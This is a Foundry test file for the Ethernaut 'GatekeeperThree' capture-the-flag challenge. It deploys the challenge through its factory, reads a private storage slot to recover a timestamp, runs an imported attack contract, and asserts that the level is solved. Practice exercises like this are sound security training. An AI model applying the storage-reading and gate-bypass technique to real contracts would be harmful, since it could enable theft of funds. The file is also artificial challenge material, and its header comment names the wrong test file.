// SPDX-License-Identifier: UNLICENSED
// forge test -vvvvv --match-path '*27-GoodSamaritanTwo.t.sol'
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/28-GatekeeperThree.sol";
import "../contracts/28-GatekeeperThreeAttack.sol";
import "../contracts/28-GatekeeperThreeFactory.sol";
import "../lib/forge-std/src/console2.sol";

contract GatekeeperThreeTest is Test {
    using stdStorage for StdStorage;

    GatekeeperThreeFactory public factoryContract;
    address public eoa;
    address public challengeAddress;

    function createUsers(uint256 userNum) internal returns (address[] memory) {
        address[] memory users = new address[](userNum);
        for (uint256 i = 0; i < userNum; i++) {
            // Compute the address from the given priv key
            address user = vm.addr(uint256(keccak256(abi.encodePacked(i))));

            // Fund user with 100 Eth
            vm.deal(user, 100);
            users[i] = user;
        }
        return users;
    }

    function setUp() public {
        // Create EOA and take the 0th (1st) element from the returned array
        eoa = createUsers(1)[0];
        // log eoa address
        console2.log("eoa:", eoa);

        // Deploy factory to create challenge instance
        factoryContract = new GatekeeperThreeFactory();

        // Deploy challenge contract
        challengeAddress = factoryContract.createInstance{value: 0.001 ether}(address(eoa));
    }

    // function afterRun() public returns (bool) {
    //     console2.log("Running afterRun");
    //     return false;
    // }

    function testCheck() public {
        address payable payableChallengeAddress = payable(challengeAddress);
        GatekeeperThree challenge = GatekeeperThree(payableChallengeAddress);

        // Get Challenge Instance
        vm.startPrank(eoa, eoa);

        // Deploy the attack contract
        GatekeeperThreeAttack attackContract = new GatekeeperThreeAttack(challengeAddress);

        // Add funds to attack contract
        vm.deal(address(attackContract), 1 ether);

        // Call the function that deploys trick contract
        challenge.createTrick();

        // Read the third storage slot of the SimpleTrick contract
        address sT_addr = 0x41C3c259514f88211c4CA2fd805A93F8F9A57504;
        uint256 timestamp =
            uint256(vm.load(sT_addr, 0x0000000000000000000000000000000000000000000000000000000000000002));
        console.log("tS: ", timestamp);

        // Attack
        attackContract.attack(1);

        // Check if attack was successful
        assert(factoryContract.validateInstance(payableChallengeAddress, eoa));
    }
}
